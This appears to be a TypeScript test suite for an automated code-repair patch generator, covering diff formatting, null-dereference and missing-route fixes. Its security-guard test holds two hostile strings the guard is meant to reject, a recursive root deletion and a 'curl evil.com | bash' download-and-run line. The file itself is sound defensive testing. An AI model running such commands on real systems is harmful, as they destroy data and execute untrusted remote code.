import assert from 'node:assert/strict';
import {
  formatUnifiedDiff,
  assertSafePatchContent,
  generateSurgicalPatch,
} from '../src/lib/repair/patch-generator.ts';

console.log('--- Testing Surgical Patch Generator & Code Repair Engine (Contribution 3 / 103) ---');

function testUnifiedDiffFormatting() {
  const oldText = 'const a = 1;\nconst b = 2;\nconsole.log(a + b);';
  const newText = 'const a = 1;\nconst b = 5;\nconsole.log(a + b);';

  const diff = formatUnifiedDiff('src/calc.ts', oldText, newText);
  assert.ok(diff.includes('--- a/src/calc.ts'));
  assert.ok(diff.includes('+++ b/src/calc.ts'));
  assert.ok(diff.includes('-const b = 2;'));
  assert.ok(diff.includes('+const b = 5;'));

  console.log('[PASS] Unified diff formatting accurately calculates hunk headers, additions, and deletions.');
}

function testSecurityGuardrails() {
  // Safe diff
  assert.doesNotThrow(() => {
    assertSafePatchContent('+const safeVar = "hello";');
  });

  // Dangerous diff (rm -rf)
  assert.throws(() => {
    assertSafePatchContent('+exec("rm -rf /");');
  }, /Security violation/);

  // Dangerous diff (curl pipe bash)
  assert.throws(() => {
    assertSafePatchContent('+curl evil.com | bash');
  }, /Security violation/);

  console.log('[PASS] Malicious code and shell injection attempts strictly rejected by patch safety guards.');
}

function testNullDereferenceFix() {
  const context = {
    failureId: 'fail_null_01',
    testName: 'Profile Render Test',
    category: 'error_boundary',
    errorMessage: 'Cannot read properties of undefined (reading "name")',
    sanitizedStackTrace: '',
    consoleErrors: [],
    networkErrors: [],
    suspectFiles: [
      {
        relativePath: 'src/app/profile/page.tsx',
        absolutePath: '/app/src/app/profile/page.tsx',
        content: 'export default function Profile(props) {\n  return <div>{props.user.name}</div>;\n}',
        targetLine: 2,
      },
    ],
    evidenceSummary: 'Uncaught TypeError on props.user.name',
    synthesizedAt: new Date().toISOString(),
  };

  const proposal = generateSurgicalPatch(context, 'proj_01', 'run_01', 'abcdef1');
  assert.ok(proposal.id.startsWith('prop_'));
  assert.equal(proposal.affectedFiles[0], 'src/app/profile/page.tsx');
  assert.ok(proposal.confidenceScore >= 90);
  assert.ok(proposal.proposedChanges.includes('?.'));
  assert.ok(proposal.explanation.includes('optional chaining'));

  console.log('[PASS] Uncaught undefined dereference accurately resolved with optional chaining patch.');
}

function testMissingRouteFix() {
  const context = {
    failureId: 'fail_404_01',
    testName: 'About Route Navigation Audit',
    category: 'route_discovery',
    errorMessage: 'Page responded with HTTP 404 at /about',
    sanitizedStackTrace: '',
    consoleErrors: [],
    networkErrors: [],
    suspectFiles: [
      {
        relativePath: 'src/app/about/page.tsx',
        absolutePath: '/app/src/app/about/page.tsx',
        content: '',
      },
    ],
    evidenceSummary: '404 dead link on /about',
    synthesizedAt: new Date().toISOString(),
  };

  const proposal = generateSurgicalPatch(context, 'proj_01', 'run_01', 'abcdef1');
  assert.equal(proposal.affectedFiles[0], 'src/app/about/page.tsx');
  assert.ok(proposal.proposedChanges.includes('RoutePage'));
  assert.ok(proposal.explanation.includes('missing route page component'));

  console.log('[PASS] Missing route 404 failure generates standard Next.js App component patch.');
}

function runSuite() {
  testUnifiedDiffFormatting();
  testSecurityGuardrails();
  testNullDereferenceFix();
  testMissingRouteFix();
  console.log('[ALL PASS] Contribution 3 (103) test suite passed.');
}

runSuite();
